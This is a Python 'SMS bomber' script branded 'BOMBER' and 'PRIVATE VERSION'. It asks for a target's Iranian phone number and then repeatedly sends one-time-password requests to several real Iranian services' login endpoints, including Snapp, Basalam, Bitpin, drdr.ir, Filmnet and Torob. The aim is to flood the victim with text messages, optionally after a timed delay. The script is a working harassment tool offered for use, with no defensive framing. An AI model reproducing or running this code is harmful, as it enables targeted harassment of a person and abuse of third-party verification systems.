libraries = ["Config", "platform", "os", "sys", "requests", "time", "colorama"]
def Check(x) :
    try:
        exec(f"import {x}")
    except:
        sys.exit(f"\033[91m [-] Error (Import-L6) - Install {x}")
x = [Check(i) for i in libraries]
import Config, platform, os, sys, requests, time
from colorama import Fore,init
init()

System = platform.uname()[0]
Clear = "cls" if System == "Windows" else "clear"
os.system (Clear)

def banner() :
    print(Fore.YELLOW, f"""
 ╔════════════════════════════════════════════════════════╗
 ╚═╗ ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗  ║
   ║ ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗ ║
   ║ ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝ ║
   ║ ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗ ║
   ║ ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║ ║
   ║ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ║
   ╚══════════════════════════════════════════════════════╝
         +[ @ARTORKI ]    =+=    [ PRIVATE VERSION ]+        
 ══════════════════════════════════════════════════════════
""", Fore.LIGHTCYAN_EX)
banner()

try:
    connection = requests.get("http://google.com/")
except:
    sys.exit("\033[91m [-] Error (Connection-L34) - No Internet")

while True :
    print(Fore.LIGHTYELLOW_EX, """\n [~] Enter Phone Number:
 [C] Contacts
 [E] Exit
""", Fore.LIGHTCYAN_EX)
    try:
        input_home = input(" [Bomber|--> ")
    except:
        sys.exit("\n\033[91m [-] Error (Values-L44) - Wrong Number")

    if input_home == "C" or input_home == "c" :
        for i in Config.contacts :
            print(Fore.YELLOW, i)
        print(Fore.LIGHTYELLOW_EX, """
 [D] Delete Contact
 [N] New Contact
 [C] Continue
""", Fore.LIGHTCYAN_EX)
        try:
            input_contacts = input(" [Bomber|--> ").lower
        except:
            sys.exit("\n\033[91m [-] Error (Values-L57) - Wrong Input")
        if input_contacts == "d":
            print(Fore.LIGHTYELLOW_EX, "\n [~] Enter A Number:", Fore.LIGHTCYAN_EX)
            try:
                input_delete = eval(input (" [Bomber|--> "))
                Config.contacts.remove(input_delete)
            except:
                sys.exit("\n\033[91m [-] Error (Values-L64) - Wrong Input")
        elif input_contacts == "n":
            print(Fore.LIGHTYELLOW_EX, "\n [~] Enter A Phone Number:", Fore.LIGHTCYAN_EX)
            try:
                input_new = input(" [Bomber|--> ")
                Config.contacts.append(input_new)
            except:
                sys.exit("\n\033[91m [-] Error (Values-L71) - Wrong Input")
        elif input_contacts == "c":
            continue
        else:
            sys.exit()

    elif input_home == "" or input_home[0] == "0" or input_home[0] == "+":
        sys.exit("\n\033[91m [-] Error (PhoneNumber-L78) - Wrong Number")
    elif input_home[0] != "t" and len(input_home) != 10 or input_home[0] == "t" and len(input_home) != 13:
        sys.exit("\n\033[91m [-] Error (PhoneNumber-L80) - Wrong Number")
    else:
        break

if input_home[0] == "t":
    input_home = input_home[:-11]
    run_time = input_home[1]
    print(Fore.LIGHTYELLOW_EX, f"\n [~] Start Sending in {run_time} Hours")
    run_time = int(run_time) * 60
    try:
        time.sleep(run_time)
    except:
        sys.exit()

num = 0
def SMS() :
    # time.sleep(5)
    num =+ 1
    r01 = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", data={"cellphone": f"+98{input_home}"})
    r02 = requests.post("https://api.snapp.express/mobile/V5/user/loginMobileWithNoPass?client=SUPERAPP_SPLITPAGE&optionalClient=SUPERAPP_SPLITPAGE&deviceType=SUPERAPP_SPLITPAGE&appVersion=5.6.6&clientVersion=4bec0266&optionalVersion=5.6.6&UDID=3245bbc5-3a18-49a3-8b61-23cacb11c41d", data={"cellphone": f"+98{input_home}"})
    r03 = requests.post("https://auth.basalam.com/otp-request", {"mobile": f"0{input_home}"})
    r04 = requests.post("https://bit24.cash/api/auth/check-mobile", data={"mobile": f"0{input_home}"})
    r05 = requests.post("https://api.bitpin.ir/v1/usr/sub_phone/", data={"phone": f"0{input_home}"})
    r06 = requests.post("https://drdr.ir/api/registerEnrollment/verifyMobile", data={"phoneNumber": input_home, "userType": "PATIENT"})
    r07 = requests.get(f"https://filmnet.ir/api-v2/access-token/users/0{input_home}/otp")
    r08 = requests.get(f"https://api.torob.com/V5/user/phone/send-pin/?input_home=0{input_home}")
    r09 = requests.get(f"https://api.torob.com/V5/user/phone/send-pin/?input_home=0{input_home}")
    print(f" [+] {num*5} SMS Sent to :  " + input_home)
    if num <= 5000 :
        SMS()

print(Fore.LIGHTGREEN_EX)
try:
    print(" [+] Start Sending To " + input_home)
    SMS()
except:
    print(Fore.LIGHTRED_EX, "[-] Error (Requests-L116) - Error Sending")
    sys.exit()

sys.exit("\n\n\033[93m [~] Finished")
